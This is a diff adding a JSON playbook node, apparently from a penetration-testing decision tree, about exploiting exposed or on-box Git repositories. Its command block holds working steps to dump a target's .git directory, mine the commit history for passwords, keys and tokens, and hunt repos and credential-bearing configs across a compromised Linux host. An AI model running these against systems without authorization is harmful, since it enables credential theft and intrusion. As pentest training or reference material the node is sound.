@@ -1,0 +1,38 @@
+{
+  "id": "git_exposed",
+  "phase": "WEB",
+  "title": "Git Repository — Exposed on Web or Found On-Box",
+  "body": "A .git directory exposed on a web server leaks the full source history — every commit, every file that was ever added including ones later deleted, and any secrets ever committed. Nmap flags it with http-git: 'Found .git repository'. Feroxbuster finds /.git/ as a 301. Either signal means pull the whole repo, not just browse it.\n\nOn a Linux foothold, find .git directories in home dirs, /opt/, /var/www/ — commit history on internal repos routinely holds plaintext credentials, API keys, and private keys added 'temporarily' months ago and never properly rotated. One git log grep is worth running before any manual file hunting.\n\nTwo completely different situations, same tooling: web-exposed repo (dump it to Kali) vs on-box repo (read it directly).",
+  "cmd": "# ══════════════════════════════════════════════════\n# 1 — DETECT\n# ══════════════════════════════════════════════════\n# nmap signal:\n#   http-git: Found .git repository\n#   http-git: HEAD file present\n# feroxbuster/gobuster signal:\n#   301/200 on /.git/ or /.git/HEAD\n\n# Confirm manually:\ncurl -s http://<IP>/.git/HEAD\n# Returns: ref: refs/heads/main  → repo is fully exposed, not just HEAD\ncurl -s http://<IP>/.git/config\n# Shows remote URL — sometimes contains creds: https://user:pass@github.com/...\n\n# ══════════════════════════════════════════════════\n# 2 — DUMP (web-exposed .git → reconstruct source)\n# ══════════════════════════════════════════════════\n# git-dumper pulls the entire repo including history:\npip install git-dumper --break-system-packages 2>/dev/null || pipx install git-dumper\ngit-dumper http://<IP>/.git/ /tmp/dumped_repo\ncd /tmp/dumped_repo\n\n# Alternatively with wget (slower but no tool needed):\nwget -r -np -nH --cut-dirs=1 http://<IP>/.git/ -P /tmp/git_raw\ncd /tmp/git_raw && git checkout -- .\n\n# ══════════════════════════════════════════════════\n# 3 — MINE HISTORY FOR SECRETS\n# ══════════════════════════════════════════════════\n# Full history with diffs — the most thorough:\ngit log --all --full-history -p 2>/dev/null | grep -iE 'pass|secret|key|token|cred|api|auth|pwd' | head -50\n\n# Cleaner — just the diff lines that added secrets:\ngit log --all -p 2>/dev/null | grep '^+' | grep -iE 'pass|secret|key|token|api_key|password'\n\n# Check every commit message first (fast, no diffs):\ngit log --all --oneline\n# Look for: 'fix creds', 'remove password', 'temp key', 'revert' — those are the ones\n\n# Show a specific commit in full:\ngit show <COMMIT_HASH>\n\n# Show what changed in a commit (diff only):\ngit show <COMMIT_HASH> --stat    # which files changed\ngit show <COMMIT_HASH> -- <file> # that file's diff\n\n# Recover a deleted file (existed in history, not in working tree):\ngit log --all -- <filename>              # find which commits had it\ngit show <COMMIT_HASH>:<filename>        # print its content at that commit\n\n# All files that ever existed in any branch:\ngit log --all --full-history --name-only --format='' | sort -u\n\n# ══════════════════════════════════════════════════\n# 4 — GREP THE CURRENT SOURCE\n# ══════════════════════════════════════════════════\n# After dump — search the working tree:\ngrep -r 'password\\|passwd\\|secret\\|api_key\\|token' . --include='*.php' --include='*.py' --include='*.js' --include='*.env' --include='*.conf' -l\ngrep -r 'password\\|passwd\\|secret' . --include='*.php' -n | grep -v 'placeholder\\|example\\|TODO'\n\n# DB connection files — highest value:\nfind . -name 'conn.php' -o -name 'config.php' -o -name 'database.php' -o -name '.env' | xargs grep -iE 'pass|host|user|db' 2>/dev/null\n\n# ══════════════════════════════════════════════════\n# 5 — ON-BOX (Linux foothold — find local git repos)\n# ══════════════════════════════════════════════════\n# Find all git repos on the box:\nfind / -name '.git' -type d 2>/dev/null | grep -v proc\n\n# Quick win — grep history across all found repos:\nfor repo in $(find / -name '.git' -type d 2>/dev/null | grep -v proc | sed 's/\\.git$//'); do\n  echo \"=== $repo ===\"\n  git -C \"$repo\" log --all -p 2>/dev/null | grep -iE '^\\+.*(pass|secret|key|token|api)' | head -20\ndone\n\n# .git/config often has remote URL with embedded creds:\nfind / -path '*/.git/config' 2>/dev/null | xargs grep -h 'url' 2>/dev/null\n\n# ══════════════════════════════════════════════════\n# 6 — TOOLS\n# ══════════════════════════════════════════════════\n# trufflehog — finds secrets across all git history automatically:\ntrufflehog git file:///tmp/dumped_repo --only-verified\n# or on a remote:\ntrufflehog git http://<IP>/.git\n\n# gitleaks — similar, pattern-based:\ngitleaks detect --source /tmp/dumped_repo -v",
+  "warn": "git log -p alone on a large repo produces gigabytes of output — always pipe through grep or limit with -n 50. A 'ref: refs/heads/main' response to /.git/HEAD means the entire object store is downloadable, not just the HEAD file. Check /.git/config for embedded credentials in the remote URL before running git-dumper — it's often the fastest win. Deleted files and reverted commits still exist in git history forever; the file not being in the current working tree means nothing.",
+  "choices": [
+    {
+      "label": "Found DB creds in source/config",
+      "next": "creds_found"
+    },
+    {
+      "label": "Found SSH private key in history",
+      "next": "ssh_key"
+    },
+    {
+      "label": "Found API key / token — web app target",
+      "next": "burp_authn"
+    },
+    {
+      "label": "Source code shows SQL injection point",
+      "next": "sqli_test"
+    },
+    {
+      "label": "Source code shows file upload endpoint",
+      "next": "file_upload"
+    },
+    {
+      "label": "Back to web enum",
+      "next": "web_enum"
+    },
+    {
+      "label": "Back to Linux credential hunting",
+      "next": "linux_password_hunt"
+    }
+  ]
+}
